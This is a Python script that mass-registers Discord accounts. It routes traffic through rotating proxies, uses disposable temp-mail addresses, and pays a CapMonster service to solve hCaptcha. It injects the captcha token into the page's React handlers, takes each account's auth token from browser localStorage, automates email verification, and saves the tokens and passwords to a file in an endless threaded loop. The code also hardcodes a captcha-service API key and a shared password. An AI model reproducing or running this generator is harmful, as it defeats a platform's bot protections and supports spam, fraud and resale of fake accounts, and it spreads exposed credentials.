import ctypes
import scipy.interpolate as si
import numpy as np
import subprocess
import pickle
import json
from bs4 import BeautifulSoup as soup
from random import randint
from threading import Thread
import threading
from itertools import cycle
from colorama import Fore, Back, Style
import colorama
import requests
import string
import inspect
import os
import signal
import random
import webbrowser
import time
import re
import sys
from mails import GetDiscordEmail, GetEmail
from playwright.sync_api import sync_playwright
import asyncio
from playwright.async_api import async_playwright
import httpx
import base64
from base64 import *
from base64 import b64encode
def get_captcha():
    captchakey = "973bdf9325894e3eb403201135a27329"
    json2 = {
        "clientKey": captchakey,
        "task":
        {
            "type": "HCaptchaTaskProxyless",
            "websiteURL": "https://discord.com/register",
            "websiteKey": "f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34"
        }
    }
    r = requests.post("https://api.capmonster.cloud/createTask",
                      json=json2)  # creates task
    taskid = r.json()["taskId"]
    print(f"created task {taskid}")
    while True:
        time.sleep(5)
        json1 = {
            "clientKey": captchakey,
            "taskId": taskid
        }
        try:
            # gets the task result
            r1 = requests.post(
                "https://api.capmonster.cloud/getTaskResult", json=json1)
            part_one = r1.json()["solution"]
            captcha_key = part_one["gRecaptchaResponse"]
            print(captcha_key)
            return captcha_key
        except:
            print("not ready")
genned = 0
captcha = 0
failed = 0
class data:
    def name():
        r=requests.get('https://story-shack-cdn-v2.glitch.me/generators/username-generator?')
        return r.json()["data"]["name"]
    def get_email(cookie):
        while True:
            time.sleep(1)
            email = str(GetEmail(cookie))
            email_strip = email.split("@")[1]
            if email_strip == "tempmail.dev":
                a=1
            else:
                return email
def search(path):  # get file
    random_filename = random.choice([
        x for x in os.listdir(path)
        if os.path.isfile(os.path.join(path, x))
    ])
    return os.path.join(path, random_filename)


def encode(path):
    image = open(path, 'rb')
    image_64_encode = b64encode(image.read()).decode('utf-8')
    return image_64_encode

def changepfp(token):
    proxy = random.choice(open("proxies.txt","r").read().splitlines())
    proxymap = {
        "all://": f"http://{proxy}"
    }
    random_base64 = (
        encode(search(r"C:/Users/alex/Desktop/discord token manager/pfps")))
    headers = {
        'authority': 'discord.com',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAyIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTc2NjIsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
        'x-context-properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6IjQ4MDgzMTUxMDMzMzg4MjM2OSIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI1ODkwOTUwMjgwOTQ0MDI1NjMiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjB9',
        'authorization': token,
        'x-debug-options': 'bugReporterEnabled',
        'accept-language': 'en-US',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9002 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36',
        'content-type': 'application/json',
        'accept': '*/*',
        'origin': 'https://discord.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://discord.com/channels/@me',
        'cookie': '__dcfduid=9d4d5ba476cd3f84e32e97b25f91e9fb; __stripe_mid=a7fe7b18-ea66-4268-a79a-1f5bbee212ced3bdbd; __sdcfduid=e9520f15f3fd11eba88c42010a0a07e051f212cac5618434dc9367c0e598ad99f5120b9cbf209e8fadd86549e75193f0',
    }

    data = '{"avatar":"data:image/png;base64,%s"}' % (random_base64)
    response = requests.patch(
        'https://discord.com/api/v9/users/@me', headers=headers, data=data, proxies=proxymap)
    status = response.status_code
    if status == 200:
        return response.text
    else:
        return None

def meanu():
    global genned, captcha, failed
def gen():
    global genned, captcha, failed
    username = data.name()
    password = "alexisveryhotlol"
    pt1 = requests.get("https://tempmail.dev/").headers["set-cookie"]
    cookie = pt1.strip("PHPSESSID=; path=/")
    mail = data.get_email(cookie)
    proxy = random.choice(open("proxies.txt","r").read().splitlines())
    with sync_playwright() as p:
        for browser_type in [p.firefox]:
            browser = browser_type.launch(headless=False ,proxy={"server": f'http://{proxy}'})
            sex = browser.new_context()
            page = sex.new_page()
            try:
                page.goto('https://discord.com/register')
                time.sleep(1)
                page.type("#app-mount > div.app-1q1i1E > div > div > div > form > div > div > div:nth-child(1) > div > input", mail)
                time.sleep(.3)
                page.type("#app-mount > div.app-1q1i1E > div > div > div > form > div > div > div:nth-child(2) > div > input", username)
                time.sleep(.3)
                page.type("#app-mount > div.app-1q1i1E > div > div > div > form > div > div > div:nth-child(3) > div > input", password)
                page.type("#react-select-2-input", "January\n")
                time.sleep(.3)
                page.type("#react-select-3-input", "1\n")
                time.sleep(.3)
                page.type("#react-select-4-input", "2000\n\n")
                page.wait_for_selector("iframe")
                captcha = get_captcha()
                page.evaluate(f"document.querySelector('iframe').parentElement.parentElement.__reactProps$.children.props.onVerify('{captcha}')")
                time.sleep(5)
                try:
                    token = page.evaluate("""
                    (_ => {
                    const win = window.open();
                    const token = win.localStorage.token;
                    win.close();
                    return token;
                    })();
                    """)
                except:
                    print("failed to gen the token")
                time.sleep(6)
                takes = 0
                while True:
                    verifyy = GetDiscordEmail(cookie)
                    if str(verifyy) == "[]":
                        takes +=1
                        print(f"getting email {takes}")
                        if takes == 5:
                            print("failed to get email")
                            return
                    else:
                        link = verifyy
                        break
                print(verifyy)
                page.goto(link, wait_until="load")
                time.sleep(3)
                try:
                    page.click("iframe")
                except:
                    pass
                token2 = str(token)
                token3 = token2.replace('"',"")
                file = open("accounts.txt","a")
                abv = changepfp(token3)
                if abv == None:
                    print("token locked")
                    return
                file.write(f"{token3}:{mail}:{password}\n")
                genned += 1
                print("done {}".format(genned))
                time.sleep(4)
                page.close()

            except Exception as e:
                print(e)
while True:
    os.system("title genned: {} threads: {}".format(genned, str(threading.active_count())))
    if threading.active_count()<=1:
        threading.Thread(target=gen).start()